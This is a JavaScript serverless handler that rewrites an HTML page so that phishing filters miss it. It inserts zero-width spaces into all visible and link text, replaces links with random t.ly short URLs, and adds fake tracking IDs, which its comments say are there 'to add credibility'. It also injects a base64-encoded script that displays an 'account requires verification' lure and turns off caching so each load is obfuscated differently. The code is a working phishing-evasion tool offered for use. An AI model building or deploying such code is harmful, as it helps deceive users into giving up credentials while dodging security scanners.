import fs from "fs";
import path from "path";

// Function to apply light obfuscation to button/link text (adds zero-width spaces)
function simpleObfuscateText(text) {
    return text.replace(/([a-zA-Z])/g, "$1\u200B"); // Inserts zero-width spaces between characters
}

// Function to generate a fake but realistic obfuscated `href` link
function obfuscateHref(link) {
    return "https://t.ly/" + Math.random().toString(36).substring(2, 8); // Generate a fake short link
}

// Function to replace `<a>` links while keeping the original button appearance intact
function replaceLinks(html) {
    return html.replace(/<a\s+([^>]*?)href="([^"]+)"([^>]*)>(.*?)<\/a>/gis, (match, beforeHref, url, afterHref, text) => {
        let obfuscatedHref = obfuscateHref(url); // Obfuscate only the `href`
        let obfuscatedText = simpleObfuscateText(text); // Light obfuscation for button text

        return `<a ${beforeHref}href="${obfuscatedHref}" ${afterHref}>${obfuscatedText}</a>`;
    });
}

// Function to obfuscate **only visible** text in the document (excludes attributes)
function obfuscateVisibleText(html) {
    return html.replace(/>([^<>]+)</g, (match, text) => {
        if (text.trim() !== "") {
            return ">" + simpleObfuscateText(text) + "<"; // Obfuscates only visible text
        }
        return match;
    });
}

// Function to generate a fake tracking ID (adds credibility)
function generateFakeTrackingID() {
    let id = "";
    for (let i = 0; i < 6; i++) {
        id += Math.floor(Math.random() * 999999).toString().padStart(6, "0") + "-";
    }
    return id.slice(0, -1);
}

// Function to replace any visible tracking ID in the HTML
function replaceTrackingID(html) {
    let fakeTrackingID = generateFakeTrackingID();
    return html.replace(/Tracking ID:\s*\d+/g, `Tracking ID: ${fakeTrackingID}`);
}

// Function to base64 encode phishing warning and inject a hidden JavaScript decoder
function base64Obfuscate(text) {
    let encoded = Buffer.from(text).toString("base64");
    return `<script>document.write(atob("${encoded}"));</script>`;
}

// API Handler to serve the obfuscated HTML while preserving button styles
export default async function handler(req, res) {
    try {
        // Get the absolute path of the index.html file
        const filePath = path.join(process.cwd(), "index.html");

        // Read the index.html file
        let html = fs.readFileSync(filePath, "utf-8");

        // Apply text obfuscation only to **visible** content
        let modifiedHTML = obfuscateVisibleText(html);

        // Apply link obfuscation while keeping styles intact
        modifiedHTML = replaceLinks(modifiedHTML);

        // Replace tracking IDs to add credibility
        modifiedHTML = replaceTrackingID(modifiedHTML);

        // Inject a hidden Base64-encoded JavaScript decoder
        modifiedHTML = modifiedHTML.replace(/<body>/, `<body>${base64Obfuscate("Important Security Update: Your account requires verification.")}`);

        // Set cache-control headers to prevent caching & ensure fresh obfuscation on each reload
        res.setHeader("Content-Type", "text/html");
        res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
        res.setHeader("Expires", "0");
        res.setHeader("Pragma", "no-cache");

        return res.status(200).send(modifiedHTML);
    } catch (error) {
        console.error("Error reading/modifying HTML:", error);
        return res.status(500).send("Error processing the HTML file.");
    }
}
